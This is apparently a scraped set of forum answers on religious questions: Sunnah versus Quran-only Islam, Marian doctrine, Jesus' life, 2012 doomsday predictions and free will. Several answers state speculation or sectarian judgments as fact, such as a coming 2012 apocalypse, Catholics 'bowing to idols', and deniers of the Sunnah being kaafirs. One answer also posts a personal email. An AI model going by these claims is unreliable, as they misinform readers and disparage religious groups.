Because of religion we were able to progress into a civil nation that made history and overcame much evil dominance over the years from people like Hitler, religion made us stonger, so I like to think that thier is a God that is capable of any and everything, only he leaves our lives to our own power, and lets us progress in our own mistakes and the mistakes of others or we would never learn, like when a kid touches a hot stove.|`|l1ctIW7eaa	yeah, or find a way to come up with a better punishment system than humans have devised|`|tx4bRDrXaa	2 Peter 1:20,21  No prophecy of scripture springs from any private interpretation.For prophecy was at no time brought by man's will but men spoke from God as they were borne along by Holy Spirit. 2 Timothy 3:16  According to this scripture the Bible does not need interpretation,it has already been interpreted by God himself.    Many men have tried this but obviously not all of them are right,twisting the scriptures to fit our own ideas can result in lasting harm.  2 Peter 3:15,16  Two things can help us to understand the Bible correctly .  First consider the context (surrounding verses) of any statement.  Next,compare texts with other statements in  the Bible that deal with the same subject.  In that way we are letting God's own word guide our thinking,and the interpretation is not ours but God's.  Also praying for understanding before we set down to read the Bible can give us God's Holy Spirit to really understand the truth from his word.If we are serious and want to learn he will teach us from his word.If anyone comes to us with a teaching or talking about the Bible,we need to make sure that they show us from the scriptures and prove what is being said.

The men who wrote and compiled the Bible were inspired, but that doesn't mean that everything they wrote was pristine truth, even considering all the cultural differences between now and then.    Add to that the fact that He gave us a brain and expects us to use it when reading the  Bible.

[al-Nisaa 4:80] Allaah described obedience to the Prophet (peace be upon him) as being a part of obedience to Him. Then He made a connection between obedience to Him and obedience to the Prophet (peace be upon him): O you who believe! Obey Allaah and obey the Messenger . . . [al-Nisaa 4:59]    (b) Allaah warns us not to go against the Prophet (peace be upon him), and states that whoever disobeys him will be doomed to eternal Hell. Allaah says (interpretation of the meaning): . . . And let those who oppose the Messengers commandment beware, lest some fitnah (trial, affliction, etc.) befall them or a painful torment be inflicted on them. [al-Nur 24:63]    (c) Allaah has made obedience to His Prophet a religious duty; resisting or opposing it is a sign of hypocrisy: But no, by your Lord, they can have no Faith, until they make you [Muhammad] judge in all disputes between them, and find in themselves no resistance against your decisions, and accept (them) with full submission. [al-Nisaa 4:65]    (d) Allaah commands His slaves to respond to Him and His Messenger: O you who believe! Answer Allaah (by obeying Him) and (His) Messenger when he calls you to that which will give you life . . . [al-Anfaal 8:24]    (e) Allaah also commands His slaves to refer all disputes to him: . . . (And) if you differ in anything amongst yourselves, refer it to Allaah and His Messenger . . . [al-Nisaa 4:59]  _____________________________    (2) The Sunnah itself indicates the importance of the Sunnah. For example:    (a) Al-Tirmidhi reported from Abu Raafi and others that the Prophet (peace be upon him) said: I do not want to see any one of you reclining on his couch and, when he hears of my instructions or prohibitions, saying I dont accept it; we didnt find any such thing in the Book of Allaah. Abu Eesaa said: This is a saheeh hasan hadeeth. (See Sunan al-Tirmidhi, Shaakir edition, no. 2663).    Al-Irbaad ibn Saariyah, may Allaah be pleased with him, reported that the Prophet (peace be upon him) said: Would any of you think, reclining on his couch, that Allaah would only describe what is forbidden in the Quraan? I tell you, by Allaah, that I have warned and commanded and prohibited things that are as important as what is in the Quraan, if not more so. (Reported by Abu Dawud, Kitaab al-Khiraj wal-imaarah wal-fay).    (b) Abu Dawud also reported from al-Irbaad ibn Saariyah, may Allaah be pleased with him, that the Messenger of Allaah (peace be upon him) led us in prayer one day, then he turned to us and exhorted us strongly . . . (he said), Pay attention to my sunnah (way) and the way of the Rightly-guided Khaleefahs after me, adhere to it and hold fast to it. (Saheeh Abi Dawud, Kitaab al-Sunnah).  _______________________________    (3) The scholars consensus (ijmaa) affirming the importance of the Sunnah.    Al-Shaafii, may Allaah have mercy on him, said: I do not know of anyone among the Sahaabah and Taabieen who narrated a report from the Messenger of Allaah (peace be upon him) without accepting it, adhering to it and affirming that this was sunnah. Those who came after the Taabieen, and those whom we met did likewise: they all accepted the reports and took them to be sunnah, praising those who followed them and criticizing those who went against them. Whoever deviated from this path would be regarded by us as having deviated from the way of the Companions of the Prophet (peace be upon him) and the scholars who followed them, and would be considered as one of the ignorant.  ___________________________    (4) Common sense indicates the importance of the Sunnah.    The fact that the Prophet (peace be upon him) is the Messenger of Allaah indicates that we must believe everything he said and obey every command he gave. It goes without saying that he has told us things and given instructions in addition to what is in the Quraan. It is futile to make a distinction between the Sunnah and the Quraan when it comes to adhering to it and responding to it. It is obligatory to believe in what he has told us, and to obey his instructions.    The ruling concerning those who deny the importance of the Sunnah is that they are kaafirs, because they deny and reject a well-known and undeniable part of the religion.  _____________________________    The saheeh Sunnah is wahy (Revelation) from Allaah : http://www.islam-qa.com/en/ref/77243    Does the command of the Prophet (peace and blessings of Allaah be upon him) mean that something is obligatory? : http://www.islam-qa.com/en/ref/72242    The misguided sect of al-Quraaniyyeen : http://www.islam-qa.com/en/ref/3440  __________________________|`|AA12279768	?????? ????? ?????? ????? ????? ???? ???? ????? ??????? ??????? ????? ??????

"Say (O Muhammad): if you (truly) love Allah, follow me! Allah will then love you and forgive your sins. And Allah is All Forgiving, All Merciful."} (Sura Al Imraan ayah  31) note: This ayah makes it very clear that if anyone claims to love Allah (swt) they have to follow the sunnah and only then will Allah (swt) love them and forgive them.  Many people today say we love Allah and they talk against the sunnah and the Ullima have said that anyone who does this is a liar and does not love Allah (swt) or they would follow the beloved prophet of Allah (SAW), as it is an order od Allah (swt) to do so.     "Whatever of good reaches you, is from Allah, but whatever evil befalls you, is from yourself. And We have sent you (Muhammad) as a Messenger to humanity, and Allah is sufficient as a witness. He who obeys the Messenger, has indeed obeyed Allaah, but he who turns away, then We have not sent you as a watcher over them. (Surah An-Nisa Ayat   79-80)     "And whoever obeys Allah and His Messenger will be admitted to Gardens under which river flow, to abide therein and that will be the great success. And whosoever disobeys Allaah and His Messenger, and transgress His Limits, He will cast him into the Fire, to abide therein, and he shall have a disgraceful torment." (Surah An-Nisa ayat  13-14)    "Indeed in the Messenger of Allaah you have a excellent example (to follow) for him who hopes in (the meeting with) Allaah and the Last Day and remembers Allaah much." (Sura  33 ayah  21)    "Whatsoever the Messenger gives you, take it; and whatsoever he forbids you, abstain (from it). And fear Allaah; verily, Allaah is severe in punishment." (Sura  59 ayah  7)     "O you who believe! Obey Allaah and obey the Messenger, and those of you who are in authority. If you differ in anything among yourselves, refer it to Allaah and His Messenger if you believe in Allaah and the Last Day. This is better and more suitable for final determination."|`|nS7koC7Oaa	This verse, it comes with a WARNING of disobeying the prophet's teachings:    "Obey Allah and obey the messenger, and beware! But if ye turn away, then know that the duty of Our messenger is only plain conveyance (of the message)." (5:92)    Also:  "O ye who believe! Obey Allah, and obey the messenger and those of you who are in authority; and if ye have a dispute concerning any matter, refer it to Allah and the messenger if ye are (in truth) believers in Allah and the Last Day. That is better and more seemly in the end." (4:59)      "...And whatsoever the messenger giveth you, take it. And whatsoever he forbiddeth, abstain (from it). And keep your duty to Allah. Lo! Allah is stern in reprisal." (59:7)        "But no, by thy Lord, they can have no (real) Faith, until they make thee judge in all disputes between them, and find in their souls no resistance against thy decisions, but accept them with the fullest conviction." (4: 65).      "But for the Grace of Allah to thee and His Mercy, a party of them would certainly have plotted to lead thee astray. But (in fact) they will only lead their own souls astray, and to thee they can do no harm in the least. For Allah hath sent down to thee the Book and Wisdom and taught thee what thou knewest not (before): and great is the Grace of Allah unto." (4: 113).      Say: "If ye do love Allah, follow me: Allah will love you and forgive you your sins; for Allah is Oft-Forgiving, Most Merciful." (3: 31).      "Then We put thee on the (right) Way of Religion: so follow thou that (Way), and follow not the desires of those who know not." (45: 18).      "He who obeys the Messenger, obeys Allah; but if any turn away, We have not sent thee to watch over their (evil deeds)." (4: 80).      "Say: "Obey Allah, and obey the Messenger: but if ye turn away, he is only responsible for the duty placed on him and ye for that placed on you. If ye obey him, ye shall be on right guidance. The Messenger's duty is only to preach the clear (Message)." (24: 54).      "When they are summoned to Allah and His Messenger, in order that He may judge between them, behold, some of them decline (to come)." (24: 48).      "Deem not the summons of the Messenger among yourselves like the summons of one of you to another: Allah doth know those of you who slip away under shelter of some excuse: then let those beware who withstand the Messenger's order, lest some trial befall them, or a grievous Penalty be inflicted on them." (24: 63).      "Ye have indeed in the Messenger of Allah a beautiful pattern (of conduct) for any one whose hope is in Allah and the Final Day, and who engages much in the praise of Allah." (33: 21).     Anyone who has read the holy Qur'an knows that Allah (swt) repeats his command to us to follow the Prophet, and obey him, and stay away from anything that he forbids, many times in the holy Qur'an. All these verses point to the fact that we must abide by and follow the Sunnah, and that we cannot obey Allah (swt) without following the Sunnah because Allah (swt) himself in the holy Qur'an asks us and requires us to follow the Sunnah.|`|mOWyzwubaa	how come ,at the time of Prophet,all the writtings (hadith) were destroyed,by the all the caliphs,and after 230 yrs these books were written again in direct defiance of Prophet Muhammed command.    39:23 Quran is the Best Hadith    MUHAMMED FORBIDS THE WRITING OF HADITHS       Because God knows that some sincere believers will get lost and will be looking into the Hadith books for guidance, God insisted on putting enough signs for those sincere ones to see for themselves that these fabrications are not from God and rather an idol-worship practice condemned by God and His messenger.     Hadiths books have enough material to direct the sincere believer to stick ONLY to the Quran as God ordered us. We do not need the proof herein from the hadith books, but we include it here to show the how God plans to expose the disbeliedvers and the hypocrites     (1) Ibn Saeed Al-Khudry reported that the messenger of God had said,     "Do not write anything from me EXCEPT QURAN. Anyone who wrote anything other than the Quran shall erase it."     The following historical incident happened about 30 years after the death of the Prophet Muhammed and shows that the Prophet never canceled his order not to write but the Quran. The hadiths books however contained some fabricated hadiths that are considered by the same Hadiths scholars as very weak, trying to indicate that Muhammed changed his view about writing the hadiths. The readers of the hadith to follow, that happened about 30 years after the death of the Prophet, will conclude by themselves that the Prophet Muhammed never authorized the writing of the hadiths since the time he told his followers not to write but the Quran..     (2) From Ibn Hanbal;     Zayd Ibn Thabit (The Prophet's closest revelation writer) visited the Khalifa Mu'aawiyah (more than 30 years after the Prophet's death), and told him a story about the Prophet. Mu'aawiyah liked the story and ordered someone to write it down. But Zayd said. " the messenger of God ordered us NEVER to write anything of his hadith,"     (3) The famous book, "Ulum Al-Hadith" by Ibn Al-Salah, reports a hadith by Abu Hurayra in which Abu Hurayra said the messenger of God came out to us while we were writing his hadiths and said; "What are you writing?" We said, "Hadiths that we hear from you, messenger of God." He said, "A book other than the book of God ?!" We said, "Should we talk about you?" He said, Talk about me, that would be fine, but those who will lie will go to Hell. Abu Hurayra said, we collected what we wrote of Hadiths and burned them in fire.       (4) In the famous book, "Taq-yeed Al-Ilm", Abu Hurayra said, the messenger of God was informed that some people are writing his hadiths. He took to the pulpit of the mosque and said, "What are these books that I heard you wrote? I am just a human being. Anyone who has any of these writings should bring it here. Abu Hurayra said we collected all these and burned them in fire.       (5) Ibn Hanbal in his Musnad book, narrates a hadith in which Abdullah Ibn Omar said, "the messenger of God one day came out to us as if he was going to depart us soon and said, "When I depart you (die), hold to the book of God, prohibit what it prohibits and accept as halal what it makes halal."     He never mentioned the Sunna in this hadiths.     (6) Again, in the book "Taq-yeed Al-Ilm", Abu Saeed Al-Khudry said, " I asked the messenger of God a permission to write his hadiths, but he refused to give me a permission."    Now the MOST Important Question,  why didnt these people who wrote tens of volumes of hadith books     "Obey Allah and Obey Rasool"    how come this disobedience to Allah Allmighty and Rasool could be part of Islam.|`|j5gEUywjaa	no it doesn't...Allah says to only follow the Quran    Quran: 5 ; 44  Lo! We did reveal the Torah, wherein is guidance and a light, by which the prophets who surrendered (unto Allah) judged the Jews, and the rabbis and the priests (judged) by such of Allah's Scripture as they were bidden to observe, and thereunto were they witnesses. So fear not mankind, but fear Me. And barter not My revelations for a little gain. Whoso judgeth not by that which Allah hath revealed: such are disbelievers.     Quran: 5 ; 45   And We prescribed for them therein: The life for the life, and the eye for the eye, and the nose for the nose, and the ear for the ear, and the tooth for the tooth, and for wounds retaliation. But whoso forgoeth it (in the way of charity) it shall be expiation for him. Whoso judgeth not by that which Allah hath revealed: such are wrong-doers.    Quran: 5 ; 47  Let the People of the Gospel judge by that which Allah hath revealed therein. Whoso judgeth not by that which Allah hath revealed: such are evil-livers.    Quran: 69 ; 38  But nay! I swear by all that ye see    69.39 And all that ye see not    69.40 That it is indeed the speech of an illustrious messenger.    69.41 It is not poet's speech - little is it that ye believe!    69.42 Nor diviner's speech - little is it that ye remember!    69.43 It is a revelation from the Lord of the Worlds.    69.44 And if he had invented false sayings concerning Us,    69.45 We assuredly had taken him by the right hand    69.46 And then severed his life-artery,    69.47 And not one of you could have held Us off from him.    69.48 And lo! it is a warrant unto those who ward off (evil).    69.49 And lo! We know that some among you will deny (it).    69.50 And lo! it is indeed an anguish for the disbelievers.    69.51 And lo! it is absolute truth.    69.52 So glorify the name of thy Tremendous Lord.       so that's why I only read the Quran and I don't read the hadiths.
FvoxgjbJaa	The Immaculate Conception refers to the Blessed Virgin Mary; it is a dogma of the Catholic Church as proclaimed by the Pope in the 1850's. Do you not remember St. Bernadette of Lourdes? Our Lady appeared to Bernadette and spoke to her saying: "I am the Immaculate Conception."    I don't think that Jesus' life was under threat until the time of His birth when Herod ordered the death of all the male children 2 years and under who lived in and around Bethlehem. He did this because the three Magi, who came to adore Jesus, did not return to Herod with the information that Herod sought from them (as to the whereabouts of the baby Jesus) because the Magi had been warned in a dream not to return to Herod.    Truly though, the life of Jesus was one of sorrow from the moment of His incarnation in the womb of the Virgin Mary until His painful and ignominous death on the Cross some 33 years later--a death brought about by the very people He came to save.    "He came unto His own and His own received Him not."    He (Jesus) was a Man of Sorrows. Imagine how God empties Himself of everything and allows Himself to be enclosed in the womb of the Blessed Virgin Mary for nine months. This was the greatest act of humility that not even the angels in Heaven could have imagined had it not been revealed to them by God. But when He is born, we find Him born in a lowly stable between two animals--and He is God! So from birth we can see how the people were so oblivious to the prophecies that they did not recognize the time of His coming.    When we attend Holy Mass, we are like the young shepherds, we are God's friends invited to adore God as He is born on the altar during Mass. When we receive Him in Holy Communion we should meditate on how Jesus is born into our hearts.|`|yDJiiqcsaa	Paul Cyp is right on target. The Immaculate Conception is the belief that Mary was conceived  (in the normal human way) in the womb of her mother, Anne, without original sin on her soul. God preserved her from original sin because he knew that He would later ask her to be the mother of Jesus.  Whereas Mary conceiving through the power of the Holy Spirit is NOT the Immaculate Conception as commonly mistakenly believed - it is just later referred to as the "virgin birth".     Why were they under threat ? because evil hates/opposes good - always has - always  will.|`|7422ddf097669bd7b6e3d48e56258b87aa	Mary is the Immaculate Conception.     Jesus was conceived by the power of the Holy Spirit and born of the Virgin Mary.    Jesus life was apparently under threat from the beginning because unmarried pregnant women were liable to be stoned to death, under the Jewish law.    This was actually not a concern, because no one, not even the devil himself had the power to take the life of the only begotten son of God.    Of course, no one but God knew that, at the time.|`|yQNit56Qaa	John S has the right idea - sort of.    Under Mosaic Law, if someone engaged (betrothed) had sex with some man other than her betrothed, AND if it was consensual (not rape), AND it was proven in a legal trial with at least 2 witnesses, AND the judge ordered that the convicted be executed, then the woman should be stoned.  (verses 23-29)  http://www.studybibleforum.com/htm_php.p...    Now, it's important to understand the verses given are out of context - which is good for your assignment, but bad for your understanding.    IF you take this passage out of context, you can conclude that, because Mary was pregnant, and because Joseph was not the father, she could have been dragged outside the city and stoned for betraying her betrothal vows.    HOWEVER, the reality is that such a thing would have been considered murder under Mosaic Law.  NO execution was permitted without a trial and the passing of a sentence by either a duly appointed judge or, in specific cases, the town elders (equivalent to our "city council").  There *always* had to be TWO witnesses of the crime for any conviction resulting in execution to take place - and only Joseph could attest that he was not the father if it came to trial.  Finally, Mary almost certainly would have been able to prove (with physical evidence!) that she was still a virgin - so it would not be possible for her to be convicted on the evidence available.    SO, it may make it seem more thrilling and dangerous to think that Mary could have been dragged outside and stoned at any time just because she was pregnant before she was married - but the truth is that such a thing would be counted as murder under Mosaic Law.    Jim, http://www.bible-reviews.com/selector_rc...|`|f7fcb6877caa0ad4f41dd9af2258ee0aaa	The Immaculate Conception has nothing to do with the birth of Jesus. That doctrine describes the conception of His mother.  If you mean the virgin birth, then it was both His mother and Himself whose lives were threatened, since Jewish women pregnant out of wedlock could be stoned to death.|`|1ffb5797d2e26ccb8eb17dd3db6e22c0aa	Normally I don't help people if I SENSE it is for School.  BUT I think they worded this in a weird way.    OK, I THINK this means because she was a virgin when she got pregnant and therefore,  according to Jewish custom,  If the baby was not Joseph's he had the right to break off the engagement or I THINK even haver her stoned.  Because even though they were only engaged... Engagments were MUCH more serious back then... you were betrothed to the person and as such, cheating on him was a HUGE offense to his honor.  Likewise,  a women who got pregnant with someone other then her finance or husband was "damaged" was unmarryable... was essentially a whore, acorrding to their customs. So IF Joseph rejected her.. then she could have been stoned OR at the very least.. Jesus would have been an outcaste of society and never been able to fullfill the proophesies of the messiah's birth.     BUT.. luckily Joseph was wise enough to accept her and take her as his wife anyways.

John 3:13 John 6:38 In Proverbs 8:22-31   He is spoken of as wisdom personified and there it is spoken about a heavenly life prior to earth In Geneses 1:26 It says:"Let us make man in our image this was God talking to his son Jesus he was the firstborn of all creation,his only begotten.Colossians 1:15  In Luke 2:46-49 He answered his parents and said Should I not be in my Father's house?  Meaning the temple,All of those who listened to him was in constant amazement at his understanding and his answers .The reason was he had been taught by his Father in the heavens and existed there ,maybe for millions of years before  being planted in Mary's womb by Holy  Spirit.To come to earth to save mankind.  Luke 1:31,32  Psalm 83:18 Exodus 6:3  Mark 1 40:41 When seeing a leper he was moved with pity for him and healed him.  If you had the ability to do one thing that was good such as heal the sick or raise the dead,I'm sure you would do it.Jesus had the abilities to do whatever he wanted.But he never used his powers to benefit himself it was always to help others.  At Luke 5:30 "At this the Pharasees began murmuring to his desciples saying,"Why is it you eat and drink with tax-collectors and sinners ?In reply Jesus said to them,"Those who are healthy do not need a physician ,but those who are ailing do .I have come to call,not righteous persons,but sinners to repentence.  Proverbs 2:1-9|`|el8yX5q3aa	I don't think Jesus discriminated on who he associated with.  Most of the apostles weren't the most religious of people when he got them.  MOST people didn't believe he was the Messiah.      The key to this whole subject should be spiritual,we all should live spiritually and not be divided by a religion that is the point and what Jesus showed us is the key for a good life he walked among all the classes, the down trodden,the drunk,the meek all people, spiritual,nonspiritual, and taught he had no picks, one was no better than the other. The baglady means just as much to Jesus as the Priest,Pastor,Minister etc. No one is above another,there was no religion when Jesus visited these Temples etc. He was checking what they were teaching the people,it is OK together together,to pray or whatever but there is no religion named in the Bible saying this is what Jesus practiced or this is the best one to follow,you follow the path and footsteps of Jesus and how can you go wrong...Peace      Some might say...    The bible does not tell of Jesus following a religion, but it also does not tell of him breaking the Jewish faith (though he did commit acts against the temple which can be seen as breaking Jewish law  , if not faith) Jesus was born a Jew, from a Jewish mother and so in Jewish law is a Jew. In Catholic (read early proto-Christianity) law/canon he was never confirmed or baptized and so never entered the House of God.    Jewish people are not baptized and John the Baptist baptized him.  I just realized that...strange huh?     Does ones action denote ones religion, we have gotten to the point that there was no religion,being Jew does not denote your religion that is your culture.    WOW..this is a great question.....and confusing one isn't it?  But then Jesus's life was confusing.    I do know the Bible says that he did not discrimiate against the classes.          Thanks for an interesting Question...I have to star this one.|`|zefFTf8Aaa	home work huh??  this part of his life is not known|`|Z4TGcA9Jaa	Jesus was so interested with the high priests because he had no mentor no one to share his knowledge with so when he made his journey to Jerusalem he felt himself drawn to the religious "hangout" just like if your a mechanic when you walk into a garage do you sit and talk too the customers of go talk to the mechanics? also twelve was considered the age a young boy would become a man in society. a answer to your second half Jesus mixed with common people and the sick because he had power to comfort and heal people. even know he was off noble blood he choose to spend his time with commoners he stated in Matthew that it is harder for a rich person to enter into heaven (be humbled and accept him) than a camel to pass threw the eye of a needle|`|AA11008046	Catholic Christian isn't an appropriate term is it?  Catholics bow to idols, pray to the priest, call him father and other viloations of Christian faith.  Let me elaborate on one:  father - God said call no man on earth your father because one is your father which is in Heaven.- so why call the priest father?  Can't do that if you are truly christian (follower of Christ)  God said |..unless you do as He said then you are none of His.." Asking forgivenness from the Priest in the booth: God says there is only one mediaator between God and man and that is Jesus Christ.  The high priests that Jesus spent time with were Jewish Rabbis.  Jesus had trouble with the Jewish law because all laws of that time and this were man made and therefore questinable.  Jesus mixed with all types of folks. Even a harlot.  The people wanted to stone her for her deeds but Jesus ask them which among you have no sin throw the first stone.  Jesus healed lepers, and manner of sick.  Jesus cast the demons out of the man found to be filled with the devil.  So you see Jesus was not a snob hill man.  He associated with all types.  Not to have them as friends but to deal with their problems and that proves He is no respector of persons.  He loves the lowly and the rich.  He heals the gutter tramp and the king.  Jesus had the attributes of God but in man form so He had the ability to do all these things without getting trapped into doing things he ought not.|`|7422ddf097669bd7b6e3d48e56258b87aa	Jesus spent time in the Temple around the age of 12 because it was the appropriate time for his bar mitzvah ... his rite of spiritual maturity as a young Jewish man.    The office of High Priest and all the associated temple services had some 200 years before Jesus, been literally put up for bid, with the highest bidder winning the right to operate the profitable religious/political concession.    Corruption was the rule of the day, with abuses both rampant and severe, prevalent throughout.     Furthermore, the time for the law had almost run out. Jesus was poised to institute the New Covenant in his blood. The fulfillment of all the promises of old, based on God's grace. Not law.    Jesus chose his associates in order to fill out the ranks of his apostles and disciples, to announce the Kingdom of God to the world, to chastise the evil and the corrupt, and to ultimately fulfill all necessary biblical prophecy.

All a waste really...|`|LoDFhlINaa	Yes, i will think it will end on December 21, 2012 because I watch a video that sayed and explaned all of it and the I Ching stopped at that date and the Mayan calender ends at that time too. Im scarred too and I hope it wont happen. And theres supose to be a change at that date that happends like evey 24000 years or so and no human has experianced it yet so we are going to be the first, and mabey the last.|`|K3q71IQeaa	There may be something to this 2012. Ive been researching this for a long time. Everyone who just rules it out immediately arent very well informed. In order for you to make an opinion on whether or not the world will endlook around you. Coincidences are EVERYWHERE. Mayans didnt say the world would endbut they didnt say it wont either. Two ancient civilizations with no contact, they mayans, and the ancient Chinese came to the same exact DAY. Prophets, physcics, religion they all intertwine. The apocalypse has been predicted before and all were wrong. However this is the first one with scientific data behind it. The alignment and not to mention global warming. If you want more proof the apocalypse may be closer than we thinkjust LOOK AROUND YOU. Americas economy is going in the shitter. Do you realize if America has to stop exporting food for some reason like a depression100 nations will instantly starve. Global warming catastrophes could be upon us before the decade is up. Over a million people will be homeless in areas of Bangladesh because of massive flooding from melting polar ice. Heat waves in Europe could kill thousands. Not to mention more tsunamis and hurricanes. And what about disease? The last huge pandemic was less than 85 years ago. Influenza killed estimated 20-100 million in world war I alone. Smallpox killed half a billion a few hundred years ago. All it takes is another disease like that to occur and we have a huge chunk of humanity taken out. Also what about an accident? Lets say a foreign country launches a nuke at a test site in the oceans and the US sees it coming as an attackthey have less than a minute to retaliate. Less than a minute to determine a nuclear holocaust. So lets see.weve got war, disease, famine/depression.all we need is the antichrist which the bible says will come and we got ourselves the 4 horsemen of the apocalypse. Extinction is something that people say can never happenwellsince the dawn of the Earth 99.999999% of the species who once inhabited this planet are now extinct. Im not saying the world will end in 2012. Im saying that there is a good possibility of this world going to hell in the next decade. You dont need any prophets to tell you that. Message or respond ne more questions cuz maybe I left something out and Ill be happy to prove you wrong. If you think im crazy, prove something wrong in this logic and i'll fill u in.|`|EtCRnDJMaa	does this mean I can go on a shopping spree|`|QR5HbJQ0aa	According the the Mayan Calender the World will be Renewed, not end...

The mayans didnt predict the "end" they just never finished their calendar! and besides, do you really think they are smarter than us? they were hooligans! besides, people are saying they are predicting the end of the world, yet the couldnt even predict their own downfall. And to all the people who do believe this, im going to PERSONALLY laugh at you when 2012 comes along and we are all perfectly fine|`|AA11440601	No.    One of several Mayan calendars is the Long Count calendar, which is reset to day 0 every 1,872,000 days or 7057.5 years. The next reset date, by some calculations, is December 21, 2012. This is not a prediction of the end of the world.    These predictions are scare tactics, conspiracy theories, and chances to make money from books and movies.    Ever since the Y2K and 6/6/6 (June 6, 2006) End of the World scenarios did not pan out, the scare mongers, conspiracy theorists, book sellers, and television executives have been touting the 2012 End of the World scenario. When 2012 does not happen either, I am sure they will think of something else.    "But of that day or hour, no one knows, neither the angels in heaven, nor the Son, but only the Father. Be watchful! Be alert! You do not know when the time will come." (Mark 13:32-33)    Jesus told us in no uncertain terms that we were not to know when the end of the world would come but that we were always to be ready.    The early Christian Church thought that Jesus was going to return at any moment. Only after a couple of centuries did the Church realize that it may be 2,000 or 4,000 or 8,000 years before Jesus returns.    The Catholic Church wisely follows Jesus' advice and teaches that each of us should live as if we will meet our maker in the next ten minutes and that we need to work to make the world a better place for our 100 X great-grandchildren.    Do not worry about the end of the world. Trust God to make sure everything happens to plan. Just be ready to meet God at any time.    For more information, about what Catholics believe about the end of the world, see: http://www.americancatholic.org/Newslett...    With love in Christ.|`|bFnIipyxaa	Nope.

Believe this and you will be in heaven, no matter what!     Please pray now: "Jesus, please forgive me of my sins. I believe that You died on the cross for my sins and You rose from the dead.

Allah has sent down miracles, revelations and messengers to give clear proofs He exists and more important, what we should do once we come to this realization.    Allah has sent prophets and messengers with many proofs throughout the ages for people to be able to clearly see with their own eyes and to be able to use their own senses the miracles and proofs pointing to the fact, Allah does in fact, exist.    Miracles of prophets and messengers of Allah have come to people through the ages. Moses (peace be upon him) showed many miracles to pharaoh and to the children of Israel. Plagues, locusts, water turning to blood, his stick becoming a snake, the voice in the burning bush and the parting of the Red Sea are clear miracles for the people of Moses time.    Again, Allah sent Jesus, the son of Mary (peace be upon him) with clear miracles for the people of his time. Speaking from the cradle while still a new born infant, creating birds from clay, curing the sick, giving sight to the blind and even bringing a dead man back to life, were all clear signs to the people to know Jesus (peace be upon him) was a messenger of Allah as was Moses before him.    Muhammad (peace be upon him) was the last and final messenger of Allah, and he was sent to all of mankind. Allah sent him with a number of miracles, not the least of which was the Quran. The predictions and prophecies of Muhammad (peace be upon him) have come true even in this century and the Quran has been used to convince even scientists of the existence of Allah.  [Please visit "Science Proves Allah": Watch video of famous scientists admit Quran is from Allah and even accept Islam]    The Quran is the best of proofs for the existence of Allah and today over one and half billion people memorize and recite from the exact text, in the exact same language it was revealed in; Arabic. More than 10 million Muslims have completely memorized the entire Quran from cover to cover, and can recite it from memory without looking at it.    No one sees or hears Allah, not even the prophet Muhammad (peace be upon him). Nor are we able to use our senses to make some kind of contact with Him. However, we are encouraged in Islam to use our senses and our common sense to recognize this entire universe could not possibly come into existence on its own. Something had to design it all and then put it into motion. This is beyond our ability to do, yet it is something we can understand.    We know from the teachings of Muhammad (peace be upon him) the proofs for the existence of God (Allah) are most obvious to us in our everyday surroundings. Anyone with understanding would quickly acknowledge His existence provided they are not so stubborn as to ignore the obvious evidences right in front of us.    We don't have to see an artist to recognize a painting, correct? So, if we see paintings without seeing artists painting them, in the same way, we can believe Allah created everything without having to see Him (or touch, or hear, etc.)."

If he did, then one would think he is the equal of humans and therefore is not fit to be the all knowing. He is everywhere, and he has been here forever and will be here forever, He is never in the need of something. A good example i read about His independancy is that he is similar to the number one. No number can create it but it can create all else (since we do not worship numbers, we can ignore the fact that they dont really work in this situation since -1 and 0 are also similar, but as i said before, we worship Allah and not numbers, this was an example). When in teh Quran it is said that he talked to Prophets, it means that Allah (since he is the all-able) sent sound waves to reach the prophet's ears. Now, One other thing that is an issue when discussing Allah is that people often use human qualities to describe God (same as Allah, Allah is the original name for Allah, God is anglisized) is that "he loves us!" first of all, Jesus is not god, God does not procreate. also, human qualities cannot apply to Allah. For exmple, he cannot be someone's "hero" because if he is, then that means he can be compared to heros like Superman, and thats were the loss of beilief comes in. Also, since Allah has 99 names (qualities) it is said that if you add a name then that means you are underminign his perfection, and that is not in any way good. Allah is only ALL-knowning, he is EVERYWHERE, he hears EVERYTHING and see EVERYTHING! He does not need a brain, ears, or eyes to do so, he is Allah. ALso, he is the creator,and he does not need a creator. For example, if a painting is shown to you, you will marvel at it and apreciate it. if somebody tells you that the picture painted itself, no sane person will believe it so. EVERYTHING HAS BEEN CREATED BY ALLAH Almighty. May Allah guide you to the path of the Truth with your own curiousity and thirst to fill in holes that will not be filled securely with anything but the Truth, Allah.     If you have any question, i will try to answer with the best of my minimal knowledge.     Allah is one  Muhammad is his Prophet  The Quran is the Holy words of Allah (not changed since its revelation to Muhammad thousands of years ago, which is more than you can say for other books like the Bible and the Torah)    noorin.alsharif@yahoo.com|`|UfTXef7Oaa	exactly wat cj and rene said

He is giving them the opportunity to let them get her a lung transplant (there's usually a waiting list) But nooo her parents say no. Insistent that it is not God's will. She dies.    God works in mysterious ways and He does work through people too.  If you ever have seen the pursuit of happyness there's a scene where the little boy tells a joke about a guy floating in the middle of the ocean, he prays to God and asks Him to save him. 3 boats go by and he tells them no thanks God will save me. Then eventually he dies, when he goes to heaven he asks God "why didn't you save me?" God says "I sent three boats to you! Should have accepted their offer"  It goes something like that.  but anyways you get my point.  :]

cNniG2L0aa	1. I think 'free-will' is over-rated and not really understood.  I can't decide to flap my wings and fly, be 6'6" tall, blonde, young, have babies, etc; the list of things I can't do, regardless of whether I want to or not, is endless.    2. IF 'god' existed 'he' would KNOW that, in 'creating' me 'he' had created an atheist who will NEVER change his mind.  So in fact 'he' created me as nothing more than another log on the fire.  Fundie will insist I have a choice in this and I will insist I don't.  I can NOT pretend to believe in invisible sky critters.  I can not MAKE myself believe in invisible sky critters.    IF 'he' exists 'he' really is a sadist and not even worth bowing to.    A true 'god' worth bowing to would NOT require it.    If you were able to manufacture some sort of living being, would you require it to worship you, glorify you, incessantly utter your name, build buildings dedicated to you, ask you for all sortsa STUFF or give thanks to you ... day in, day out, ad nauseam, endlessly?

If X (e.g. "I will accept Christ tomorrow") is true because God knows it, then God knowing is is what causes X to be true.  In that case, I can't have free will.  But if God knows X because X is true, then it is X being true that causes God to know it, not vice versa.  In that case, I CAN have free will.|`|4GiIXWUXaa	Because that presupposition doesn't make logical sense.    God is omniscient so he already knows the beginning from the end; But His omniscience is not our predestination.  Free Will indicates that there are no predetermined choices.

